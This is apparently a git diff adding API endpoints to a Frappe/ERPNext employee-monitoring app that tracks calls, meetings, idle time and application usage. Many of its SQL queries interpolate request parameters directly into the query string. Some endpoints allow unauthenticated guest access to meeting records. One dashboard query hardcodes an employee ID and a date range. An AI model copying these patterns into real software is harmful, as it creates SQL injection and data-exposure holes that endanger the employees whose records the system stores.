+    application_usage=False,
+    sales_person=False,
+    project=False,
+    issue=False,
+):
+    """
+    API_PATH: /api/method/productivity_next.api.organization_signup
+    """
+
+    url = "https://productivity.finbyz.tech/api/method/productivity_backend.api.organization_signup"
+
+    payload = json.dumps(
+        {
+            "domain": domain,
+            "organization_name": organization_name,
+            "contact_person": contact_person,
+            "email": email,
+            "mobile_no": mobile_no,
+            "fincall": fincall,
+            "application_usage": application_usage,
+            "sales_person": sales_person,
+            "project": project,
+            "issue": issue,
+        }
+    )
+    headers = {
+        "Content-Type": "application/json",
+    }
+
+    response = requests.request("POST", url, headers=headers, data=payload)
+    if response.status_code != 200:
+        return Response(
+            response=response.text,
+            status=response.status_code,
+            content_type="application/json",
+        )
+    resp_data = response.json()
+    productify_subscription = frappe.get_doc(
+        {
+            "doctype": "Productify Subscription",
+            "organization_name": organization_name,
+            "email": email,
+            "mobile_no": mobile_no,
+            "erpnext_url": domain,
+            "api_key": resp_data.get("api_key"),
+            "api_secret": resp_data.get("api_secret"),
+            "name1": contact_person,
+            "application_organization_name": resp_data.get("application_organization_name"),
+            "call_organization_name": resp_data.get("call_organization_name"),
+        }
+    )
+    productify_subscription.insert()
+    frappe.msgprint(
+        _(f"Organization signed up successfully,{productify_subscription.name}")
+    )
+
+    return Response(
+        response=response.text,
+        status=response.status_code,
+        content_type="application/json",
+    )
+
+@frappe.whitelist(allow_guest=False, methods=["POST"])
+def send_user_list(user_list):
+    url = "https://productivity.finbyz.tech/api/method/productivity_backend.api.receive_user_list"
+    organization_name = frappe.db.get_single_value(
+        "Productify Subscription", "organization_name"
+    )
+
+    if not organization_name:
+        return {"message": "Organization name is not set in Productify Subscription"}
+    productify_subscription = frappe.get_doc("Productify Subscription", organization_name)
+    payload = json.dumps({"users": user_list, "erpnext_url": frappe.utils.get_url()})
+    users = json.loads(user_list)
+    productify_subscription.list_of_users = []
+    for user in users:
+        productify_subscription.append(
+            "list_of_users",
+            {
+                "employee": user.get("name"),
+                "fincall": user.get("fincall"),
+                "application_usage": user.get("application_usage"),
+                "sales_person": user.get("sales_person"),
+            },
+        )
+    productify_subscription.save(ignore_permissions=True)
+
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": f"token {productify_subscription.api_key}:{productify_subscription.get_password('api_secret')}",
+    }
+
+    response = requests.request("POST", url, headers=headers, data=payload)
+
+    return Response(
+        response=response.text,
+        status=response.status_code,
+        content_type="application/json",
+    )
+
+
+@frappe.whitelist(methods=["GET"])
+def get_active_projects():
+    """
+    API_PATH: /api/method/productivity_next.api.get_active_projects
+    """
+    subcription = frappe.get_doc("Productify Subscription")
+    if subcription.project_tracking and subcription.issue_tracking:
+        projects = frappe.get_all(
+            "Project", filters={"status": "Open"}, fields=["name", "project_name"]
+        )
+        return projects
+    return []
+
+
+@frappe.whitelist(allow_guest=False, methods=["GET"])
+def get_employee_last_callTime(employee=None):
+    if not employee:
+        return {"message": "Something went wrong"}
+
+    last_call_data = frappe.db.sql(
+        f"""
+    select employee,employee_name,call_datetime
+    from `tabEmployee Fincall`
+    where employee = '{employee}'
+    order by call_datetime desc
+    limit 1
+    """,
+        as_dict=True,
+    )
+
+    return {
+        "employee": last_call_data[0].employee,
+        "employee_name": last_call_data[0].employee_name,
+        "call_datetime": last_call_data[0].call_datetime,
+    }
+
+
+@frappe.whitelist(allow_guest=False, methods=["GET"])
+def get_employee_fincall(employee, employee_mobile, customer_no, date, call_datetime):
+    if (
+        not employee
+        or not employee_mobile
+        or not customer_no
+        or not date
+        or not call_datetime
+    ):
+        return "Something went wrong"
+
+    employee_fincall = frappe.db.sql(
+        f"""
+    SELECT name, link_to, contact, link_name, calltype, fincall_log_ref, spoke_about
+    FROM `tabEmployee Fincall`
+    WHERE date = '{date}' AND employee = '{employee}' AND employee_mobile = '{employee_mobile}' AND customer_no = '{customer_no}' AND call_datetime = '{call_datetime}'
+    """,
+        as_dict=True,
+    )
+
+    if not employee_fincall:
+        return {"message": "No Fincall found"}
+
+    return {
+        "employee_fincall": employee_fincall[0].name,
+        "link_name": employee_fincall[0].link_name,
+        "link_to": employee_fincall[0].link_to,
+        "contact": employee_fincall[0].contact,
+        "calltype": employee_fincall[0].calltype,
+        "fincall_log_ref": employee_fincall[0].fincall_log_ref,
+        "spoke_about": employee_fincall[0].spoke_about,
+    }
+
+
+@frappe.whitelist(allow_guest=False, methods=["GET", "POST"])
+def create_fincall(
+    employee,
+    employee_mobile,
+    customer_no,
+    call_datetime,
+    calltype,
+    duration,
+    note=None,
+    raw_log=None,
+    client=None,
+):
+    employee_details = frappe.db.get_value(
+        "Employee",
+        employee,
+        ["name", "employee_name"],
+        as_dict=True,
+    )
+    if customer_no[0] == "0":
+        customer_no = "+91" + customer_no[1:]
+    elif customer_no[0] != "+" and customer_no[0] != "0":
+        customer_no = "+91" + customer_no
+
+    ec_doc = frappe.new_doc("Employee Fincall")
+    ec_doc.employee = employee_details["name"]
+    ec_doc.employee_name = employee_details["employee_name"]
+    ec_doc.employee_mobile = employee_mobile
+    ec_doc.client = client if client else None
+    ec_doc.customer_no = customer_no
+    ec_doc.call_datetime = call_datetime
+    ec_doc.duration = duration
+    ec_doc.date = get_datetime(call_datetime).date()
+    ec_doc.calltype = calltype
+    contact_query = f"""
+        SELECT 
+            c.name, 
+            dl.link_doctype, 
+            dl.link_name 
+        FROM 
+            `tabContact` AS c 
+        JOIN 
+            `tabContact Phone` AS cp 
+            ON cp.parent = c.name 
+        JOIN 
+            `tabDynamic Link` AS dl 
+            ON dl.parent = c.name 
+        WHERE 
+            LENGTH(cp.phone) >= 10 
+            AND (cp.phone = '{customer_no}' 
+            OR cp.phone LIKE '%{customer_no}' 
+            OR '{customer_no}' LIKE CONCAT("%", cp.phone))
+        ORDER BY 
+            CASE dl.link_doctype
+                WHEN 'Customer' THEN 1
+                WHEN 'Lead' THEN 2
+                ELSE 3
+            END,
+            c.modified DESC
+        LIMIT 1;
+    """
+    contact_details = frappe.db.sql(contact_query, as_dict=True)
+    if (
+        contact_details
+        and contact_details[0].get("link_doctype", "")
+        and contact_details[0].get("link_name", "")
+    ):
+        contact = contact_details[0]
+        ec_doc.link_to = contact.get("link_doctype", "")
+        ec_doc.contact = contact.get("name", None)
+        ec_doc.link_name = contact.get("link_name", "")
+
+    ec_doc.flags.ignore_permissions = True
+    ec_doc.save()
+
+    return {
+        "employee_fincall": ec_doc.name,
+        "employee": ec_doc.employee,
+        "employee_name": ec_doc.employee_name,
+        "link_to": ec_doc.link_to or None,
+        "contact": ec_doc.contact or None,
+        "link_name": ec_doc.link_name or None,
+        "fincall_log_ref": ec_doc.fincall_log_ref,
+        "spoke_about": ec_doc.spoke_about or None,
+    }
+
+
+@frappe.whitelist(allow_guest=False, methods=["GET"])
+def is_stop_disabled():
+    """
+    API_PATH: /api/method/productivity_next.api.is_stop_disabled"""
+    subscription = frappe.get_doc("Productify Subscription")
+    current_user = frappe.db.get_value(
+        "Employee", filters={"user_id": frappe.session.user}, fieldname="name"
+    )
+
+    user = next(
+        filter(lambda user: user.employee == current_user, subscription.list_of_users),
+        None,
+    )
+    return user.get("disable_stop_button", False)
+
+@frappe.whitelist(allow_guest=False, methods=["GET"])
+def get_productify_subsription():
+    """
+    API_PATH: /api/method/productivity_next.api.is_stop_disabled"""
+    subscription = frappe.get_doc("Productify Subscription")
+    current_user = frappe.db.get_value(
+        "Employee", filters={"user_id": frappe.session.user}, fieldname="name"
+    )
+
+    user = next(
+        filter(lambda user: user.employee == current_user, subscription.list_of_users),
+        None,
+    )
+    return {
+        "is_stop_disabled": user.get("disable_stop_button", False),
+        "enable_blurred_screenshot": subscription.get("enable_blurred_screenshot",False),
+    }
+
+from datetime import timedelta, datetime
+import frappe
+@frappe.whitelist()
+def calculate_total_working_hours(employee, from_date, to_date, daily_working_hours, saturday_working_hours):
+    from_date = datetime.strptime(str(from_date), '%Y-%m-%d')
+    to_date = datetime.strptime(str(to_date), '%Y-%m-%d')
+    date_range = [from_date + timedelta(days=x) for x in range((to_date - from_date).days + 1)]
+
+    holidays = frappe.db.sql("""
+        SELECT holiday_date 
+        FROM `tabHoliday` 
+        WHERE holiday_date BETWEEN %s AND %s
+    """, (from_date, to_date), as_dict=True)
+    holiday_dates = set(holiday.holiday_date for holiday in holidays)
+    if not frappe.db.exists("DocType", "Leave Application"):
+        leaves = []
+    else:
+        leaves = frappe.db.sql("""
+            SELECT from_date, to_date, half_day
+            FROM `tabLeave Application`
+            WHERE employee = %s
+            AND status = 'Approved'
+            AND ((from_date BETWEEN %s AND %s) OR (to_date BETWEEN %s AND %s) OR (from_date <= %s AND to_date >= %s))
+        """, (employee, from_date, to_date, from_date, to_date, from_date, to_date), as_dict=True)
+
+    total_working_hours = 0
+    for date in date_range:
+        current_date = date.date()
+
+        if current_date in holiday_dates:
+            continue
+
+        day_hours = daily_working_hours
+
+        # Check if it's a Saturday (weekday 5)
+        if date.weekday() == 5:
+            day_hours = saturday_working_hours
+        for leave in leaves:
+            if leave.from_date <= current_date <= leave.to_date:
+                if leave.half_day:
+                    day_hours *= 0.5
+                else:
+                    day_hours = 0
+                break
+
+        total_working_hours += day_hours
+
+    return total_working_hours
+
+
+
+@frappe.whitelist(allow_guest=False, methods=["GET"])
+def get_home_dashboard_data_for_mobile_app(employee, start_date, end_date):
+    data = {}
+    weekday_hours = frappe.db.get_single_value('Productify Subscription', 'working_hours_per_day')
+    saturday_hours = frappe.db.get_single_value('Productify Subscription', 'working_hours_on_saturday')
+
+    hours_per_weekday = float(weekday_hours) if weekday_hours else 7.5
+    hours_on_saturday = float(saturday_hours) if saturday_hours else 2.5
+    # Calculate total working hours
+    productivity_score = calculate_total_working_hours(
+        employee,
+        start_date,
+        end_date,
+        hours_per_weekday,
+        hours_on_saturday
+    )
+
+    idle_time_data = frappe.db.sql(f"""
+        SELECT from_time as start_time, to_time as end_time
+        FROM `tabEmployee Idle Time`
+        WHERE date >= '{start_date}' AND date <= '{end_date}' AND employee = '{employee}'
+    """, as_dict=True)
+
+    # Fetch fincall time logs
+    fincall_time_data = frappe.db.sql(f"""
+        SELECT call_datetime as start_time, ADDTIME(call_datetime, SEC_TO_TIME(duration)) as end_time
+        FROM `tabEmployee Fincall`
+        WHERE date >= '{start_date}' AND date <= '{end_date}' AND employee = '{employee}' AND (calltype != 'Missed' AND calltype != 'Rejected')
+    """, as_dict=True)
+
+    # Fetch meeting time logs
+    meeting_time_data = frappe.db.sql(f"""
+        SELECT meeting_from as start_time, meeting_to as end_time
+        FROM `tabMeeting` as m
+        JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+        WHERE m.meeting_from >= '{start_date} 00:00:00' AND m.meeting_to <= '{end_date} 23:59:59' AND m.docstatus = 1 AND mcr.employee = '{employee}'
+    """, as_dict=True)
+
+    # Combine all non-idle periods (meetings and calls)
+    non_idle_periods = fincall_time_data + meeting_time_data
+
+    total_idle_seconds = 0
+
+    for idle_period in idle_time_data:
+        idle_start = idle_period['start_time']
+        idle_end = idle_period['end_time']
+
+        adjusted_start = idle_start
+        adjusted_end = idle_end
+
+        for non_idle in non_idle_periods: 
+            non_idle_start = non_idle['start_time']
+            non_idle_end = non_idle['end_time']
+
+            # Check for overlap and adjust idle periods accordingly
+            if non_idle_start <= adjusted_end and non_idle_end >= adjusted_start:
+                if non_idle_start <= adjusted_start < non_idle_end:
+                    adjusted_start = non_idle_end
+                if non_idle_start < adjusted_end <= non_idle_end:
+                    adjusted_end = non_idle_start
+                if adjusted_start >= adjusted_end:
+                    adjusted_start = adjusted_end
+                    break
+
+        # Calculate the duration of the adjusted idle period
+        idle_duration = (adjusted_end - adjusted_start).total_seconds()
+        if idle_duration > 0:
+            total_idle_seconds += idle_duration
+    total_idle_time = flt(total_idle_seconds) 
+
+    list_data = []
+    meeting_total_data = frappe.db.sql(f"""
+        SELECT m.meeting_from as start_time, m.meeting_to as end_time
+        FROM `tabMeeting` as m
+        JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+        WHERE m.meeting_from >= '{start_date} 00:00:00' and m.meeting_to <= '{end_date} 23:59:59' and m.docstatus = 1 and mcr.employee ='{employee}' 
+    """, as_dict=True)
+    calls_total_data = frappe.db.sql(f"""
+        SELECT call_datetime as start_time, ADDTIME(call_datetime, SEC_TO_TIME(duration)) as end_time
+        FROM `tabEmployee Fincall`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{employee}' and (calltype != 'Missed' and calltype != 'Rejected')
+    """, as_dict=True)
+    application_total_data = frappe.db.sql(f"""
+        SELECT from_time as start_time, to_time as end_time
+        FROM `tabApplication Usage log`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{employee}'
+    """, as_dict=True)
+
+    list_data.append(meeting_total_data)
+    list_data.append(calls_total_data)
+    list_data.append(application_total_data) 
+
+    if list_data != [[], [], []]:
+
+        # Flatten the list of intervals
+        flat_intervals = [interval for sublist in list_data for interval in sublist]
+
+        # Sort intervals by start time
+        flat_intervals.sort(key=lambda x: x['start_time'])
+
+        # Merge overlapping intervals
+        merged_intervals = []
+        current_interval = flat_intervals[0]
+
+        for interval in flat_intervals[1:]:
+            if interval['start_time'] and interval['end_time'] and current_interval['end_time']:
+                if interval['start_time'] <= current_interval['end_time']:
+                    # There is overlap, so merge the intervals
+                    current_interval['end_time'] = max(current_interval['end_time'], interval['end_time'])
+                else:
+                    # No overlap, so add the current interval to the list and start a new one
+                    merged_intervals.append(current_interval)
+                    current_interval = interval
+            elif interval['start_time']:
+                # No overlap, so add the current interval to the list and start a new one
+                merged_intervals.append(current_interval)
+                current_interval = interval
+
+        # Don't forget to add the last interval
+        if current_interval:
+            merged_intervals.append(current_interval)
+
+
+        # Calculate the total time
+        total_time = timedelta()
+        for interval in merged_intervals:
+            if interval['start_time'] and interval['end_time']:
+                total_time += interval['end_time'] - interval['start_time']
+   
+        total_time = total_time.total_seconds()
+    else:
+        total_time = 0 
+
+    total_active_hours = total_time - total_idle_time
+
+    data["toal_active_hours"] = total_active_hours
+    data["total_time"] = total_time
+    data["total_idle_time"] = total_idle_time
+
+        
+    total_call_data = frappe.db.sql(f"""
+        SELECT 
+            SUM(duration) AS total_duration, calltype, count(calltype) as total_calls
+        FROM `tabEmployee Fincall`
+        WHERE date >= '2023-09-09' AND date <= '2024-09-09' and employee = 'HR-EMP-00022' and (calltype != 'Missed' and calltype != 'Rejected')
+        GROUP BY calltype
+    """, as_dict=True)
+    total_call_duration = 0
+    for call in total_call_data:
+        if call["calltype"] == "Incoming":
+            data["total_incoming_calls"] = call["total_calls"]
+            data["total_incoming_duration"] = call["total_duration"]
+            total_call_duration += call["total_duration"]
+        elif call["calltype"] == "Outgoing":
+            data["total_outgoing_calls"] = call["total_calls"]
+            data["total_outgoing_duration"] = call["total_duration"]
+            total_call_duration += call["total_duration"]
+    
+    data["total_call_duration"] = total_call_duration
+
+    total_meeting_data = frappe.db.sql(f"""
+        SELECT 
+            SUM(TIME_TO_SEC(TIMEDIFF(meeting_to, meeting_from))) AS total_duration, internal_meeting, count(internal_meeting) as total_meetings
+        FROM `tabMeeting` as m
+        JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+        WHERE m.meeting_from >= '{start_date} 00:00:00' and m.meeting_to <= '{end_date} 23:59:59' and m.docstatus = 1 AND mcr.employee = '{employee}' 
+        GROUP BY internal_meeting
+    """, as_dict=True)
+
+    total_meeting_duration = 0.0
+    data["total_internal_meetings"] = 0
+    data["total_internal_meeting_duration"] = 0.0
+    data["total_external_meetings"] = 0
+    data["total_external_meeting_duration"] = 0.0
+    data["total_meeting_duration"] = 0.0
+    for meeting in total_meeting_data:
+        if meeting["internal_meeting"]:
+            data["total_internal_meetings"] = meeting["total_meetings"]
+            data["total_internal_meeting_duration"] = meeting["total_duration"]
+            total_meeting_duration += meeting["total_duration"]
+        else:
+            data["total_external_meetings"] = meeting["total_meetings"]
+            data["total_external_meeting_duration"] = meeting["total_duration"]
+            total_meeting_duration += meeting["total_duration"]
+
+    data["total_meeting_duration"] = total_meeting_duration
+
+    total_web_data = frappe.db.sql(f"""
+        SELECT sum(duration) as total_web_duration, count(*) as total_web_count
+        FROM `tabApplication Usage log`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{employee}' and url is not null
+    """, as_dict=True)
+
+    total_app_data = frappe.db.sql(f"""
+        SELECT sum(duration) as total_app_duration, count(*) as total_app_count
+        FROM `tabApplication Usage log`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{employee}' and url is null
+    """, as_dict=True)
+
+
+    data["total_web_duration"] = total_web_data[0]["total_web_duration"] or 0.0
+    data["total_web_count"] = total_web_data[0]["total_web_count"]
+    data["total_app_duration"] = total_app_data[0]["total_app_duration"] or 0.0
+    data["total_app_count"] = total_app_data[0]["total_app_count"]
+    data["total_system_duration"] = (total_web_data[0]["total_web_duration"] or 0.0)+ (total_app_data[0]["total_app_duration"] or 0.0)
+    data["productivity_score"] = round(((total_active_hours / 3600) / productivity_score) * 100, 2)
+    return data
+
+@frappe.whitelist(allow_guest=False, methods=["POST"])
+def set_token_to_productify_subscription(token):
+    subscription = frappe.get_doc("Productify Subscription")
+    subscription.token = token
+    subscription.token_updated_on = frappe.utils.today()
+    subscription.flags.ignore_permissions = True
+    subscription.save(ignore_permissions=True)
+
+
+import re
+@frappe.whitelist(allow_guest=True, methods=["GET"])
+def get_meeting_data_for_mobile_app(user, start_date, end_date):
+    meetings = frappe.db.sql(f"""
+    SELECT
+        m.name, 
+        m.meeting_from AS start_time, 
+        m.meeting_to AS end_time, 
+        m.purpose, 
+        m.party, 
+        m.party_type, 
+        m.discussion, 
+        m.internal_meeting,
+        u.full_name AS meeting_arranged_by
+    FROM `tabMeeting` AS m
+    JOIN `tabMeeting Company Representative` AS mcr ON m.name = mcr.parent
+    JOIN `tabUser` AS u ON u.name = m.meeting_arranged_by
+    WHERE m.meeting_from >= '{start_date} 00:00:00' 
+      AND m.meeting_to <= '{end_date} 23:59:59' 
+      AND m.docstatus = 1 
+      AND (mcr.employee = '{user}' OR mcr.employee IS NULL)
+    GROUP BY m.name
+    Order by m.meeting_from desc
+    """, as_dict=True)
+    company = []
+    party = []
+    for meet in meetings:
+        meet["discussion"] = re.sub(r'<[^>]+>', '', meet["discussion"])
+        company_representative = frappe.db.sql(f"""
+            SELECT employee_name
+            FROM `tabMeeting Company Representative`
+            WHERE parent = '{meet["name"]}'
+        """, as_dict=True)
+        for rep in company_representative:
+            company.append(rep["employee_name"])
+        party_representative = frappe.db.sql(f"""
+            SELECT c.full_name as contact_name
+            FROM `tabMeeting Party Representative` as mpr
+            JOIN `tabContact` as c ON mpr.contact = c.name
+            WHERE mpr.parent = '{meet["name"]}'
+        """, as_dict=True)
+        for rep in party_representative:
+            party.append(rep["contact_name"])
+        meet["company_representative"] = company
+        meet["party_representative"] = party
+        company = []
+        party = []
+    
+    return {"meetings": meetings}
+
+
+
+@frappe.whitelist(allow_guest=False, methods=["GET"])
+def get_application_data_for_mobile_app(user, start_date, end_date):
+    data = {}
+    total_web_data = frappe.db.sql(f"""
+        SELECT sum(duration) as total_web_duration, count(DISTINCT domain) as total_web_count
+        FROM `tabApplication Usage log`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{user}' and url is not null
+    """, as_dict=True)
+
+    total_app_data = frappe.db.sql(f"""
+        SELECT sum(duration) as total_app_duration, count(DISTINCT application_name) as total_app_count
+        FROM `tabApplication Usage log`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{user}' and url is null
+    """, as_dict=True)
+
+    data["total_web_duration"] = total_web_data[0]["total_web_duration"] or 0.0 
+    data["total_web_count"] = total_web_data[0]["total_web_count"]
+    data["total_app_duration"] = total_app_data[0]["total_app_duration"] or 0.0
+    data["total_app_count"] = total_app_data[0]["total_app_count"]
+    data["total_system_duration"] = (total_web_data[0]["total_web_duration"] or 0.0)+ (total_app_data[0]["total_app_duration"] or 0.0)
+    return data
+
+
+
+import base64
+import os
+import frappe
+from frappe.utils.file_manager import get_file_path
+from frappe.utils import cstr
+
+@frappe.whitelist(allow_guest=False)
+def get_profile_photo(**kwargs):
+    employee = kwargs.get('employee')
+    
+    if not employee:
+        return {
+            "status": False,
+            "status_response": "Employee not provided",
+            "file_name": None,
+            "file_url": None,
+            "file_id": None,
+            "encoded_string": None,
+        }
+
+    file_id = frappe.get_value("Employee", employee, "image")
+    if not file_id:
+        return {
+            "status": False,
+            "status_response": "Employee has no profile photo",
+            "file_name": None,
+            "file_url": None,
+            "file_id": None,
+            "encoded_string": None,
+        }
+
+    try:
+        file = frappe.get_doc("File", {"file_url": file_id})
+        file.flags.ignore_permissions = True
+        file_url = os.path.abspath(get_file_path(file_id))
+
+        with open(file_url, "rb") as image_file:
+            encoded_string = base64.b64encode(image_file.read()).decode("utf-8")
+
+        return {
+            "status": True,
+            "status_response": "Success",
+            "file_name": file.file_name,
+            "file_url": file.file_url,
+            "file_id": file.name,
+            "encoded_string": encoded_string,
+        }
+    except Exception as e:
+        return {
+            "status": False,
+            "status_response": f"Error: {cstr(e)}",
+            "file_name": None,
+            "file_url": None,
+            "file_id": None,
+            "encoded_string": None,
+        }
+
+@frappe.whitelist(allow_guest=True)
+def get_allowed_modules(employee=None):
+    if not employee:
+        return []
+    modules = {}
+    data = frappe.get_value("List of User", filters = {"employee": employee}, fieldname = ["fincall", "application_usage", "sales_person"])
+    modules["fincall"] = data[0]
+    modules["application_usage"] = data[1]
+    modules["sales_person"] = data[2]
+    return modules
